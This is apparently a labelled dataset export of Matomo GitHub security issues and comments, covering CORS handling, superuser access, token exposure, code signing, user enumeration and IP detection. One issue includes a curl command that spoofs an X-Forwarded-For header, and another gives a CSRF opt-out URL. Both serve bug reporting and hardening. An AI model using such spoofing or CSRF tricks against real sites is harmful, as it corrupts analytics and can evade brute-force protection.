","Looks like you have some changes here from other merged PRs@justinvelluppillai fixed :)@peterhashair I'm not very familiar with the CORS stuff, but based on the documentation your PR can't work, as the origin only allows one record to be returned. See https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin
> `<origin>`
> Specifies an origin. Only a single origin can be specified. If the server supports clients from multiple origins, it must return the origin for the specific client making the request.@sgiehl I got an idea not sure if I am correct, I move the Corshandler to the Tracker main, works on my local, but I update Corshandler a little, will that cause any issues?@peterhashair I actually wasn't aware of the CORSHandler. Maybe it would make more sense to move the preflight handling completely to the CORSHandler.We are also setting cors headers here: https://github.com/matomo-org/matomo/blob/4.x-dev/core/Tracker/Response.php#L111, it might be a good idea to merge this also with CORSHandler
@sgiehl @MichaelRoosz rewrite `CORSHandler`a little bit hopefully that makes more sense.@sgiehl trying to think of a test, is there a function I can use to do a fake cors request?@peterhashair I guess you could use `Http::sendHttpRequestBy` to send a curl request with the according request headers. There should be flag you can set so the method also returns the returned status and headers so you are able to check if they are expected.@bx80 Trying to add below in the `setUp` to test the config, but it seems like the test config won't update config. any ideas?
```php
       $testingEnvironment->overrideConfig('General', 'cors_domains', 'https://example.com', true);
```` @peterhashair It might need to be an array value instead of a string
```php
$testingEnvironment->overrideConfig('General', 'cors_domains', ['https://example.com']);
```@bx80 the old function doesn't accept array, I extend the function, the last param `true` accept arrary@peterhashair There seem to be some other places where an array parameter is being used. https://github.com/matomo-org/matomo/blob/742071ed81919ebb745f7a735b03a84c26a83b03/plugins/CoreConsole/tests/System/ArchiveCronTest.php#L328@bx80 tried all kinds of different ways, but the config still won't set, any suggestions?@peterhashair I think the parent `IntegrationTestCase` class for the test already has a fixture defined which also it's own test environment initialized, instead of overriding the config setting on new test environment object you could try overriding the config on the parent fixture's test environment with:
```php
self::$fixture->getTestEnvironment()->overrideConfig('General', 'cors_domains', ['https://example.com']);
```@bx80 figure out why, if all the tests are passed will request a reviewThis issue is in ""needs review"" but there has been no activity for 7 days. ping @matomo-org/core-reviewers@justinvelluppillai This PR would now be ready to merge. But it actually changes more than the issue that should be solved. All the CORS handling is now also done for API requests. That means if the cors_domains config is set incorrect, the Matomo UI will no longer work correctly. The page will load, but all API requests will fail, causing only an error to show up.
Personally I think that behavior is kind of correct. But we might need to consider to either mention that in the dev change log and maybe also update or add an FAQ. This might be kind of a breaking change as it restricts API requests being sent from other sites...> That means if the cors_domains config is set incorrect, the Matomo UI will no longer work correctly. The page will load, but all API requests will fail, causing only an error to show up. ...  This might be kind of a breaking change as it restricts API requests being sent from other sites...

FYI if there's any kind of breaking change then we should wait for Matomo 5 before merging this. Or maybe we can prevent the breaking change in some way. We wouldn't want to break the UI.

Can we also confirm there's no security issue by this new implementation which is quite different (for all kind of web servers)? I've tested this locally and before I was not allowed to send a reporting API request from a different domain but now it allows me to send a request from that domain. Meaning this would be also a security regression.By sending a 401 or 403 response code can we also make sure this won't cause any duplicate requests to be sent in the JS tracker eg because of https://github.com/matomo-org/matomo/blob/4.10.1/js/piwik.js#L2843-L2850 where we send the same request again if there's eg a 4XX response. If there's any way this could happen then this will likely result in duplicate tracked data and increased server load.

I'm thinking at least for tracking API it's potentially on purpose maybe to send a 2XX response code in some cases instead of 4XX as the response may not be needed and the 2XX prevents users from thinking there is an error and then they email support or create bug reports when there's actually no problem. This may be different for the reporting API where the response is usually needed.

Also note that HTTP response codes of tracking and reporting API are API see https://developer.matomo.org/guides/apis meaning changing the response code is also in itself a breaking change.

Maybe the behaviour for tracking API should be unchanged, and / or generally the behaviour on the response code may need to be different depending on if any domains are configured or if the standard applies.

From what I can see generally even if the response code is a 2XX then it doesn't mean the response can be read, the browser would still show a CORS error so not sure how valid the context of the original issue is 
<img width=""1355"" alt=""image"" src=""https://user-images.githubusercontent.com/273120/171986727-fb13cc39-b5ed-44ec-8702-5f254c5ba7e2.png"">
If you don't want this PR to be closed automatically in 28 days then you need to assign the label 'Do not close'.This PR was last updated more than one month ago, maybe it's time to close it. Please check if there is anything we still can do or close this PR. ping @matomo-org/core-reviewers",yes,"c: Security,not-in-changelog,Do not close,"
matomo-org/matomo,52314816,"Review how Access::doAsSuperUser is used, and see how to use it less","The goal of this issue is to investigate the use of `Access::doAsSuperUser` 

Notes from @tsteur 
- when posting events it does not even describe that the code will be run as superuser. Who knows what plugin developers do there, they can't expect something like this...
- in general we should not have to use this at all, only under very rare circumstances. It usually just that there is a problem somewhere else. In this case one could simply call the Model to get the data instead of the API and the doAsSuperUser is no longer required.
- there is also still the command thing that runs all the commands as super user
- check super user access is resetted when a wrong token auth is given
",,no,"Task,c: Security,c: Platform,"
matomo-org/matomo,622052054,"Disable adding new plugins (for security) while still checking for plugin updates","Currently users who want to secure their Matomo installation as much as possible need to follow recommendations in https://matomo.org/docs/security-how-to/

as part of this guide, it would make sense if could add one more step which would be to **Prevent Super Users from installing or activating new plugins from the Marketplace**. Without this step, any super user could install any plugin from the marketplace which wouldn't necessarily be secure. (to be very secure, one company may decide to individually review plugins before enabling them. super users shouldn't be able to install plugins from marketplace ideally).

## Current situation

1. we set `enable_plugin_upload = 0` by default which prevents new plugins from being ""uploaded"" manually, but still the marketplace can be used
2. one can disable the Marketplace plugin, but it can be re-enabled via the UI anyway so that doesn't work (and disabling marketplace means you lose the security benefits of checking for updates for existing plugins)

## Proposed solution
So ideally we need a new feature/INI setting for example: `enable_install_plugin_from_marketplace` set to `1` by default, but when set to `0` then the feature to download the code from marketplace would be disabled (with a popup explaining why and which setting to change if needed).",,no,"Enhancement,c: Security,"
matomo-org/matomo,54440826,"Consider using sha256 instead of md5 in config/manifest.inc.php","Hi

md5 is officially broken(1) and we should consider migrating to sha256 in config/manifest.inc.php 

Thanks

Links:
1. http://en.wikipedia.org/wiki/Collision_attack#cite_note-2
","Should be easy to change in Piwik itself but also requires change in other repos such as https://github.com/piwik/piwik-package/blob/master/scripts/build-package.sh#L169
@tsteur Totally agree with you, the `build-package.sh` as well as the `Makefile`. But definitely no big deal.
",no,"c: Security,"
matomo-org/matomo,567726411,"Default setSecureCookie to true","I think that [setSecureCookie](url) should be set to `true` as a default, not an option. From my point of view, serving Matomo over https should be expected - not http. An therefor it should make sense to have [setSecureCookie=true](url) as default, and if it should not be set to true, that should be the option, that makes setting up tracking much simpler for the end user, from my perspective.

So this should be the override:

`_paq.push(['setSecureCookie', false]);
`

","Thanks for your suggestion. Guess might make sense to expect secure cookies by default.
Might be something we could evaluate for Matomo 4. It kind of breaks BC, as the tracking code needs to be adjusted for HTTP sitesI think this might be even worth breaking BC for as the alternative is having everyone using HTTPS (which should be far more people than those that don't) edit their tracking code.We had this topic few days ago in slack. Problem is when your site is not fully https, and eg some pages are http and some are https then you end up with different cookies and different visitor IDs etc. 

Many people are still using http, and for example have a login on https etc. Seeing this sometimes while investigating issues. Of course they could then just remove the line from the suggested tracking code. Would need to make sure the default tracking code we suggest has a comment next to it explaining things and explains when to remove it etc. 

> serving Matomo over https should be expected -

In this case it's the user website that matters as we are setting a first party cookie unless I'm not seeing it?Assuming we make secure cookies the default setting, we could extend the tracking code generator with an additional option `My site is served https only`, which is checked by default. And when you uncheck it the `_paq.push(['setSecureCookie', false]);` is added?BTW we should maybe rather make such a change as part of Matomo 5. Because when you change this, it can cause issues when users have HTTPS and HTTP traffic as it would create different visitors depending on protocol. 

Not sure what the benefit is though. If someone only uses HTTPS (which many sites do), then this should basically not even be needed to be called as there wouldn't be much of a benefit?The idea could be that we add the paq push call to the default generated tracking code instead of changing the default value in `matomo.js`. 

This way it is a bit more likely that users will figure out why they have double visits etc.

And it's very quick to implement.

And we don't break as many installs as it would be mostly behaviour for new installs (unless someone uses the API to get the tracking code which many do)

Problem: It would currently log `Error in setSecureCookie: You cannot use `Secure` on http.` when someone is using HTTP on their site. This will create confusion, bug reports, support requests, ... We should remove this log message in that case.@Findus23 @mikkeschiren @sgiehl can someone help me what the benefit of setting the secure cookie is when the site is only served in HTTPS anyway? In that case it wouldn't be sent over HTTP anyway?

And when someone is using HTTP and HTTPS then it wouldn't be in the interest of the user to enable secureCookie as it will generate different visitor IDs on the different protocols and cause wrong numbers.> @Findus23 @mikkeschiren @sgiehl can someone help me what the benefit of setting the secure cookie is when the site is only served in HTTPS anyway? In that case it wouldn't be sent over HTTP anyway?

That's only true if HSTS is enabled (which I assume is not true for the majority of Matomo sites). Otherwise, I think there is nothing stopping an attacker from serving the site via HTTP and linking the user to it (by MITM-ing their connection).FYI It's currently active on 24% of sites https://w3techs.com/technologies/details/ce-hsts

And I believe if you are already browsing a site on HTTPS, then a browser wouldn't the HTTP request? I just tested this on my site and the browser would block the request.",no,"c: Security,"
matomo-org/matomo,603515823,"Add new feature to allow token_auth only in POST and HTTPS requests","This would better protect the token_auth and same would apply for app specific tokens and tracking requests.

It probably wouldn't apply to the temporary token_auth used in the API which is bound to a session (in Matomo 4) so features like export should still work. 

I guess limiting to HTTPS requests only would probably already work by forcing HTTPS. The improvement be basically mostly that it guarantees the token doesn't end up in access logs. ",,no,"c: Security,"
matomo-org/matomo,177146599,"path disclosure in http://demo3.piwik.org/libs/","go to http://demo3.piwik.org/libs/ in google chrome browser

path disclosure is displayed in http://demo3.piwik.org/libs/

fix : do not disclose path disclosure in browser
","reverting #10931   because on some apache servers, `Options -Indexes` does not work and create 500 error and I couldn't find a solution. It's no big deal to have path disclosure in piwik folders IMHO",no,"c: Security,"
matomo-org/matomo,374889520,"Possibility to enumerate user","In **Change your password** page, user enumeration is happening and it must change.
Simply replace the message **Error: Invalid username or e-mail address.**  Into something like **an email has been sent to the address on record**.","I don't think we consider this a security issue. We even provide API methods for users with view access to check if a specific userLogin or userEmail exists.users with view access have indeed the ability to check whether an account exists,

 but wondering about anonymous user (thanks for reporting this issue @fadi-assaad), is it currently the only place where one can check whether a given username/email account exists? 

I suppose there are couple more places... I wouldn't be surprised if `UsersManager.getTokenAuth` exposes it, and lots of other places.Hello, do you still consider user enumeration as a non-security issue? If yes, could you please take an official stance and close this issue? And if not, could you please fix it? Thank you for your answer.

FYI, [OWASP seems to consider it as security issue](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account).",no,"c: Security,c: Usability,"
matomo-org/matomo,114668125,"Send an email / text when there's a login from another country","See #9140 

We should send an email when there's a login from another country (if GeoIP is enabled). It should be optional, possibly enabled by default (users that live near a border might want to disable it).

Email could contain IP and location, maybe even user agent / device information
","great!
we should think on the definition of ""another country"":
- do we be track and store always login place for each user and compare on next login?
- do a user have to set a home country manually?
- do we make a global ""white list"" within an installation for countries being valid for all piwik users?
one could also use this to give other login behaviours depending on country matching
e.g. in foreign countries having a lager delay after false passwort etc.
I reckon it would be good to look at some other platforms and how they solve it (eg wordpress plugins etc.). Possibly we need some settings to make it maybe configurable. Without thinking too much I'd probably only store the last country. Let's maybe better send an email too often than too less. In worst case a user gets an email too much. Would also have the benefit to signal the user that the feature works :) Don't think it justifies to store a complete history / whitelist of countries for a specific user for now
Also we could send an email when there's a login from another device / browser. We could generate a `configId` based on some browser data or set a cookie to identify a device and if one ever logs in from another device we send an email once. This might be rather related to 2 factory authentication (https://github.com/piwik/piwik/issues/2846) though
If text messages are configured in a Piwik (eg for scheduled reports) one should ideally also be able to receive it as a text message on your phone to be able to react quickly in case it wasn't you who logged in...
""Also we could send an email when there's a login from another device / browser.""
and
""one should ideally also be able to receive it as a text message on your phone""
**sounds perfect!**
An idea what data to be included in email:

**1) Reason for this mail:**
There was a login from another country than last time

**2) Full description of the account one is talking about:**
Username
Alias
Email

**3) Details of finding:**
Country of Login last time
Country of Login this time

**4) What to do now?**
If you are the one who logs-in  in a different country you can delete this mail.
If you aren't the one: Please contact your admin as fast as possible.

Maybe on should ad the email-adress of an admin for direct contact?
without a user may have no information who it is
Maybe email should not only be send to user but also to admin?
I wouldn't go that far and send it to the admin as well. It should be enough to send it to the user. 

If we have an ""Activity log"" page one day we could maybe allow a super user to see all activites of all users (such as when did a user login / logout, it shows time of creating/updating websites, users, ... etc) and maybe also add it to the Custom Alerts feature but this is a different topic :) 
+1",no,"c: Security,c: New plugin,"
matomo-org/matomo,547775922,"Provide ability to restrict auth tokens to site, access, scope","In https://github.com/matomo-org/matomo/issues/6559

I am starting to implement app specific authtokens/passwords. 

I started adding some additional features to further increase the security of tokens:

* Scope: Let users choose if token should be valid for `Reporting API`, and/or `Tracking API`, `Widgets`
* Access: I was going to let users choose what access the token should have. Eg an admin user could decide the token should have only `view` or `write` or `admin` access (but not super user)
* Sites: I was going to let the user choose whether the token should have access to all sites, or only one site.

Of course this way you could create different combination of tokens to lower the risk a lot, eg
* A write token for the tracking API that has only access to one site
* A reporting token with view permission for only a specific site even though the user is super user or write user or admin user
* A token for the exported widgets with only view access which has only access for one site

This way, even if a tracker gets the token, the scope of what they can do is quite restricted. 

It's tricky to implement though. Eg likely we would need to use completely different `Access` class depending on whether user is authenticated through UI, or through token_auth. It me mostly done though by changing maybe the behaviour of `Access:loadSitesIfNeeded` but not sure. Also we would need to check in various places eg in `API::index()` whether the token is allowed for the current scope etc.

Figured I create separate issue for now to simplify #6559.",,no,"Enhancement,c: Security,"
matomo-org/matomo,37353596,"config: add ""salt"" section for multiple salt values","WordPress has multiple salts.  Each salt is used for different scopes/situations.

Per #308
- superuser->salt will be used exclusively for the superuser's password hash
- the password table would have a new salt column, i.e., salt per user

A new [salt] section would initially contain salts for these scopes:
- cookie
- nonce
- cache-buster
- archive-lock

Modify:  Piwik_Common::getSalt(string $scope)
","Security now has its own sub-category since they're ""special"" items!
",no,"Task,c: Security,"
matomo-org/matomo,91399306,"default config: api_service_url to use https","Current download of piwik 13.x comes along with global.ini.php including

```
api_service_url = http://api.piwik.org
```

This should be changed to https asap, because MITM could compromise the api output otherwise (keep in mind that the output is presented to user including links, update information etc.)

This issue (#1867) has already been discussed 5 years ago. Now that https-api is available for a long time you should default to it. We have 2015 now and attackers use every possibility they can find.

Via MITM, tt potentionally compromises all the nice automatic update, can be used for phishing attacks, ...

Users should be recommended to use https if they have overridden the global.ini.php default.
",,no,"c: Security,"
matomo-org/matomo,803048581,"Matomo can be tricked to record spoofed X-Forwarded-For IPs","## Problem

Considering the current implementation: https://github.com/matomo-org/matomo/blob/a31fd86b64c2c7d2deadcfca71540fb4b0152c10/core/IP.php#L99-L125

With the following setup:

```
[client] -> [reverse proxy 1] -> [reverse proxy 2] -> [matomo Nginx]
```

Since each proxy appends the IP of the incoming connection according to [RFC7239](https://tools.ietf.org/html/rfc7239), `X-Forwarded-For` will be this by the time the connection reaches Nginx (1):

```
X-Forwarded-For: (client), (proxy 1)
```

Matomo currently extracts the first IP from the list, since #10404. This is correct until you realized the ""client"" can pretended to be a proxy as well, by including its own `X-Forwarded-For` header, like this:

```shell
curl -i -H""X-Forwarded-For: 8.8.8.8"" ""http://example.com/matomo/matomo.php?...""
```

When this happens, proxy 1 will be faithfully preserve the header passed in and append the client IP after it (2):

```
X-Forwarded-For: 8.8.8.8, (client), (proxy 1)
```

And Matomo will extract `8.8.8.8` as the client IP.

## Solutions

### Solution 1: Trust the ""transparent proxies""

If Matomo decided the first ""client"" IP can always be trusted, we can still extract the first IP address, and this issue can be closed as ""works as intended."" But it will in risk of having the analytics data being polluted. **Brutal force login detection can be tricked too.**

### Solution 2: Extract the last IP address

This would involve reverting #10404 and go back to extract the last IP address. Since the original `proxy_ips[]` configuration is still intact, when facing a header like (2), above, a correctly configured Matomo will be able to exclude the ""proxy 1"" IP address.

## Notes

* There can be a solution 1.1 where Mamoto will rely on proxy 1 (the first public-facing proxy) to remove the spoofed header. However this is not always possible (not possible for Apache AFAIK)
* It is unclear to me what other client IP headers (`HTTP_CF_CONNECTING_IP`, `HTTP_CLIENT_IP`, etc) behaves and if Matomo have to do things differently between these and the `X-Forwarded-For` header.
* #7060 is a staled discussion related to this, but the discussion talks about the header processing in the context before #10342.
* #16379 have since promoted `proxy_ips[]` pretty well in the documentation. We may consider doubling down on the documentation effort when we pick either solution for this issue.
* Lastly, one tiny nitpick: #10404 updated the name of the function `IP::getFirstIpFromList` but it didn't change the word ""last"" in the function comment right above it :)

Thanks!","Hi @timdream, thanks for creating this issue. Is this behavior in Matomo causing a problem for you specifically? Do you know of a client that does this and is causing a problem?@diosmosis It did not cause a problem for me! I am just trying to document what I've found that may be problematic in terms of spoofing and attack vector. I did not spot such attack/spoofing taking place on my own instance.Thanks @timdream would this be kind of a duplicate or related to https://github.com/matomo-org/matomo/issues/7060 ?@tsteur Yes the issue is related (see note), but I wouldn't say it is a duplicate because the research I made here contains new information on the current implementation.> There can be a solution 1.1 where Mamoto will rely on proxy 1 (the first public-facing proxy) to remove the spoofed header. However this is not always possible (not possible for Apache AFAIK)

that was my first thought would be the preferred solution as AFAIK in https://github.com/matomo-org/matomo/pull/10404 it says 

> The RFC at https://tools.ietf.org/html/rfc7239 makes it clear that we should extract the first IP from the header HTTP_X_FORWARDED_FOR

So changing it to last IP could potentially break things again etc. 

Another workaround might be to use other headers depending on what can be configured that can only be set by the public facing proxy? I don't know if that's the same problem for Apache.

Mostly seeing this so far as a documentation issue to mention it in the docs for setting up the proxy if it's not mentioned yet.BTW if you have a WAF then you may be able to configure to block any request having a `X_FORWARDED_FOR` request set.We are adding a new config setting for this in https://github.com/matomo-org/matomo/pull/17765

Maybe in Matomo 5 we make it default to read the last entry. However, depending on the setup the last IP might be an internal IP and it could break things.

To be evaluated with Matomo 5 whether we'll change the default.> BTW if you have a WAF then you may be able to configure to block any request having a `X_FORWARDED_FOR` request set.

You are definitely on to something.   AFAIK is it more or less best practice to replace the XFF(X-Forwarded-For) header on all traffic passing the first proxy that handles incoming traffic, with the real client source IP. Since you can never trust a client. 
But this is not up to the application to deal with IMO.

If the XFF header is present, and the ""proxy_client_headers[] = HTTP_X_FORWARDED_FOR"" is set, 
the application must be able to trust the chain of IP's. And use the **first** as client.
We have prepared this feature in https://github.com/matomo-org/matomo/pull/17765/files

Ideally we enable this security feature by default to have the IP detection more secure (`[General] proxy_ip_read_last_in_list=1`). 

Then we update the guide in https://matomo.org/faq/how-to-install/faq_98/ to mention people may need to disable this feature if the first IP should be used.Will need to be communicated in the developer changelog as well. ",no,"c: Security,"
matomo-org/matomo,44244330,"When creating a new user, the password should not be visible, but stars","Seen on Piwk.pro (Piwik 2.6.1.)

![2014-09-28_piwik_password_field](https://cloud.githubusercontent.com/assets/1004261/4436001/57540aa2-4761-11e4-8840-b52a09d5a452.png)

Thanks!
","Thanks for the suggestion!

Maybe we could also add a checkbox ""Show password"" 
",no,"Enhancement,c: Security,"
matomo-org/matomo,37354979,"Fix inconsistent sanitization: sanitize on output rather than input","The way in which Piwik deals w/ sanitizing user data is inconsistent: it is sometimes done on **input** (data is stored sanitized), sometimes on **output** (less frequently). For example, website names are stored in the DB sanitized and need to be unsanitized or outputted raw in HTML. Goal names are not sanitized in the DB and need to be escaped when outputting in HTML.

This should be made consistent. Additionally, [security best practices recommend](http://blog.ircmaxell.com/2011/03/what-is-security-web-application.html):
- filter on input (e.g. cast to an integer if you expect an integer, but don't sanitize strings)
- escape on **output**

Problems with the current approach:
- escaping on input is done for HTML/XML: that escaping doesn't makes sense for SQL, JavaScript/JSON, â€¦ And it needs to be undone for those cases
- double escaping issues if we escape on output (e.g. Twig and Angular do that by default)
  - #8496, #8123, #7987, #7969, #7806, #7531, #7528, #6821, #6722, #6325, #6068, #5189, #5009, #4749, #4709, #4231, #3954, #3549, #3503, #2519, #2400, #2386, #974, #341
- strings are stored in database escaped (not as their ""real"" values)

We should try to slowly move to sanitizing on output using native escaping features of Twig or AngularJS for example.
","- Search for`
  {{ siteName| }}` 
  - SMS report encoding
  - All consumers of websiteName

Besides Website names, what are the other entities which are stored sanitized? 

I expect maybe that many entities will store as sanitize. Fixing this has some risks for XSS we have to careful. 
- Also maybe we can remove the makeXssContent() used in tests and make the behavior consistent (ie. sanitize whether we call the API directly in PHP, or via HTTP, or whether we use API\Request object).
@matt If makeXssContent is removed, how do we test for XSS?
I didn't mean to remove the xss test itself but rather I was noting that there is also an inconsistency in the way APIs inputs are (or not) sanitized. 
Maybe this is out of scope for this ticket though.
Note: there is another inconsistent sanitization policy in Piwik, see below function:

```
    /**
     * This function will sanitize or not if it's needed for the specified action type
     *
     * URLs (Page URLs, Downloads, Outlinks) are stored raw (unsanitized)
     * while other action types are stored Sanitized
     *
     * @param $actionType
     * @param $actionString
     * @return string
     */
    private static function normaliseActionString($actionType, $actionString)
```

and: `Action::isActionTypeStoredSanitized`
#6714 has been merged into this issue
@mattab hi, as this problem is open for a long time and commonly suffered, when do you plan to fix it?Due to the complexity of this task and the high risk of introducing security regressions (in particular, XSS), so far we have not been able to work / schedule this project. I would suspect it will take a long time before we can tackle this fully, and likely it will be done step by step over time, plugin by plugin etc. Any contribution will be very welcome",no,"Task,c: Security,"
matomo-org/matomo,1373680428,"Outbound API/Plugin URL using HTTP instead of HTTPS can cause application blocking","We have a Matomo user that has configured their servers to block outbound requests that are sent over port 80 because they want to completely prevent insecure connections from being made.

When this port is blocked, several issues occur:
1. The Matomo application in certain places in the UI are effectively blocking the UI from loading or responding while Matomo attempts to make a connection to the outbound server. 
2. The connection to the external hostname eventually fails which results in plugin update checks for example to fail.

I found one example of where the HTTP hostname is defined instead of the HTTPS hostname:
https://github.com/matomo-org/matomo/blob/4.x-dev/plugins/Marketplace/config/config.php#L9

Potential solutions:
- I guess the simplest would be to just change the hostnames for outbound connections to HTTPS, but this might break things for some servers that have outdated certificate bundles.
- It would be great if we could use the HTTPS hostname by default and if that fails maybe try the HTTP hostname

But in either case, the timeout seems quite high for a failed connection at 60 seconds, which means that each time that page or a page that checks an external hostname is accessed, the Matomo UI would take a minimum of 1 minute to load. It would be good if this timeout was reduced to at least not block the page from loading for such a long time.","We have completed https://github.com/matomo-org/matomo/issues/19081 recently, and will soon make these requests use https by default.Thanks for the update @justinvelluppillai 
Is there an existing issue for changing the URLs/hostnames to use HTTPS? If so we can close this one and rather track it there?We don't have a public facing issue for this yet so this one can remain open ðŸ‘ðŸ½ Hi, just wanting to throw in that the change here (https://github.com/matomo-org/matomo/blob/4.x-dev/plugins/Marketplace/config/config.php#L9) did in fact break my installation so that every request took more than 1 minute because of the long timeout defined in the marketplace plugin.

The server is only allowed to make outbound connections for https (TCP 443) and not http (TCP 80). I had to shut down the internet features via `enable_internet_features=0` to see what's going on after what appeared to be a minor update (4.10.1 -> 4.12.0.

I would've liked to see that change in the changelog of 4.11 instead of only ""a new config setting `force_matomo_http_request`"" which is irrelevant to me. I now have to edit the `plugins/Marketplace/config/config.php` file to rewrite the URL to `https` because there seems to be no config option to override it (like `api_service_url`).

I only found out that the marketplace is not using https after dumping the URL in its service, maybe this could somehow be marked in the system diagnostics check with the curl-error if `http://plugins.matomo.org` is not reachable if the marketplace plugin is active.",no,"c: Security,"
matomo-org/matomo,1331289122,"Anonymous user access doesn't send any security alerts or require password verification","There is currently no security alert sent when the anonymous user is enabled for a Matomo instance. It also doesn't require a password for verification.

This means that any user that can set access for user accounts for a site/measurable could enable it without properly reading the warning and allow public access to their reports.

It would be good from a security perspective to do the following:
1. Send an email alert to all super users that the anonymous user has been given access to site(s)
2. Require password verification (There is already a popup, but this can be clicked without needing a password)
3. Potentially send an email notification once a week/month to super users as a scheduled task so that they are reminded that their reports are publicly accessible.
This would be useful for people who already have the anonymous user active and wouldn't have got the security alert.","Would you mind defining what the expected behavior should be when selecting multiple users (including anonymous) in the list and giving all `view` access at once? Currently not even the additional access warning is shown in that case.FYI it's actually too easy to give an anonymous user view access by accident. Especially using the multi select. Maybe an anonymous user cannot be enabled in the UI along with other users in the future?

And/or maybe ideally the `anonymous` user wouldn't appear in the users list until specifically enabled to appear there. We could always show eg this menu item:

<img width=""549"" alt=""image"" src=""https://user-images.githubusercontent.com/273120/184553111-9f685936-8952-4134-b157-05dc7ebdf833.png"">

and have a setting to enable/disable the anonymous user setting feature (just a random example).
<img width=""1279"" alt=""image"" src=""https://user-images.githubusercontent.com/273120/184553332-1de9f682-9e77-4f1a-93d6-3863d84aa9dc.png"">

Just few ideas.",no,"c: Security,"
matomo-org/matomo,111946336,"CSRF in user tracking","1) In piwik, admin can provide tracking optout option for users using iframe ""http://demo.piwik.org/index.php?module=CoreAdminHome&action=optOut&language=en""
2) If suppose attacker embeds the url and makes the user to execute the url ""http://demo.piwik.org/index.php?module=CoreAdminHome&action=optOut&language=en&setCookieInNewWindow=1&showConfirmOnly=1"", they will be tracked out from piwik analytics without their knowledge

Regards
Elamaran V
elamaran619@gmail.com
","Thanks for the report @UnlockPrice !
",no,"c: Security,"
matomo-org/matomo,59207996,"Add a timeout for auto-logoff","I noticed i stay logged in infinitely.
Shouldn't there be a timeout on inactivity?
Maybe with an option to change the time and/or to disable it?
","If you click ""Remember me"" then you will be logged in forever. I think it's by design. Maybe we could expire it after N days of inactivity... ?
@mattab Yes, it would be better to expire user session after N days of inactivity because there is no point in keeping the user session live forever if there is no user activity in the given browser tab. We need to make the user log into the site every 3 or 5 days to make sure that the user's data is not abused by others using the same computer or device. Which would be fine, 3 or 5?
When is issue resolve?
I need, that piwik web interface users autologout through N times.
When the auto logoff can be resolved?
",no,"Enhancement,c: Security,"
matomo-org/matomo,457917597,"Add 'This wasn't me' to reset password E-Mail","Hey, I thought of an option where you can click a link ""This wasn't me"" in the E-Mail which you get if someone tries to reset your password.
The IP of the attacker could be saved in the bruteforce table and be banned for the amount of time set globally in bruteforce settings.

If you can name me the files where I can see how an IP gets banned, I can also code this function myself.
Although im probably not able to code the E-Mail link.",,no,"c: Security,"
matomo-org/matomo,247269626,"Add code signing to the Piwik Plugin upgrade process","Recently I have been looking into the security implications of automatically upgrading Piwik and whilst the Piwik Core is verified using a GPG key, the plugins get no such verification. As a result, an malicious party gaining access to the plugin server could replace latest plugin versions with malicious version with no verification.

The inclusions of libsodium in PHP 7.2 makes this easier. And there are pure-PHP libraries that are supported back to PHP 5. A similar issue was raised for [WordPress](https://core.trac.wordpress.org/ticket/39309), however it was postponed due to other priorities.

My understanding is that Piwik already implements auto-updates for it's plugins and as such any attack on the Piwik plugin infrastructure could potentially expose a large number of systems to malicious code.

There is a respectable guide(also linked in that WordPress issue) [here](https://paragonie.com/blog/2016/10/guide-automatic-security-updates-for-php-developers) on implementing upgrades for PHP.","Thanks for the suggestion. Yes, it would be great to implement the code signing verification mechanism when downloading plugins from the Marketplace. And we also should implement this code signing mechanism when downloading the Piwik core platform via the auto-update mechanism. 

Note: currently, the code signing is not checked, we only download the upgrade over HTTPS. Code signing procedure has to be done manually by the users who know about it. We would like to implement this as part of https://github.com/piwik/piwik/issues/7328 
We also should surface the manual code signing instructions better, see https://github.com/piwik/piwik/issues/10687",no,"c: Security,"
matomo-org/matomo,181091470,"Add instructions on the Download Page : ""How to verify PGP/GPG signature""","Hello,
I suggest you to add more details and instructions for verify PGP/GPG signature on the download page,
_( Suggested in #1757 )_
Maybe just the link to your blog will be enough : 
[How to verify signatures for Piwik release packages](http://piwik.org/blog/2014/11/verify-signatures-piwik-packages/) (Lot of details and well documented).

Thanks,
",,no,"c: Website matomo.org,c: Security,"
matomo-org/matomo,59736580,"Never send token_auth as GET parameter, but send it as POST instead","The goal of this issue is to ensure that in Piwik core, including the `core:archive` cron task and other logic, we will not send the `token_auth` as a GET parameter. Instead we should send with POST  the `token_auth` so that it does not show up in logs and whenever the GET URL is output.

This follows up #5277 and  #7301

Also related to #4171
","Note: this is already done for Ajax requests done in the UI, was done in #3359
Note that we can also use HTTP headers to pass the token. I don't know if there's any reason to prefer one method to the other though.
After having a look, we have for example Amazon and GitHub that use the official `Authorization` HTTP header. That's probably a good example to follow.

One advantage I see with this is that you are not forced to use POST requests: you can keep using GET, but also any other HTTP method. So this would be necessary if we ever want to do REST, so I think using headers is better because it would be forward compatible.
> One advantage I see with this is that you are not forced to use POST requests: you can keep using GET

quick note: the change in this issue would not force to use POST or GET, as already Piwik API will work when called on POST or GET (either will work). currently ajax requests in the UI use POST (to hide the token_auth) and core:archive command use GET. 
It would ""force"" to use POST if you want to keep the token secure though.
To clarify: this issue is only about controlling within the Piwik
platform itself that we don't use token_auth as GET.

In general, we cannot force to use POST since already thousands of users
use GET when talking to their Piwik API and we could not break it for
them - even for 3.0.0 or other major versions
Yes the GET method with URL parameter would still work in any case.

> To clarify: this issue is only about controlling within the Piwik platform itself that we don't use token_auth as GET.

I understand but I don't see how it affects POST vs headers. We could change all requests in Piwik itself to use POST, but we could also change them to use headers for the token (and add support for that in the API). I believe going the ""headers"" way is better because it would allow us to move more easily towards rest.

If we just do POST instead of GET everywhere inside Piwik, that's going the opposite way of rest. E.g. using POST to get information doesn't make sense in HTTP.
> If we just do POST instead of GET everywhere inside Piwik, that's going the opposite way of rest. E.g. using POST to get information doesn't make sense in HTTP.

Ok I now understand your point, that we should not use POST because it's not the way of rest. +1 for that and for `Authorization` header then :+1: 
@mattab could you clarify if this affects using widgets? It seems only anonymous access would keep widgets useful as otherwise widgets would require including the token in the URL exposing it (in code, logs, etc.). Correct me if I am wrong.
Looking through my access_log recently reminded me of [a comment](https://github.com/matomo-org/matomo/issues/14099#issuecomment-463455324) @tsteur made in #14099:
> BTW: You want to send those requests through POST request otherwise you may have eg the token_auth from the request in web server log files

I just noticed the token_auth is shown in access_logs anytime the [PHP Tracking Web API client (Method 2: HTTP Request)](https://matomo.org/docs/tracking-api/#piwik-tracking-api-advanced-users) is used. For example, I see a bunch of these in my access_log:

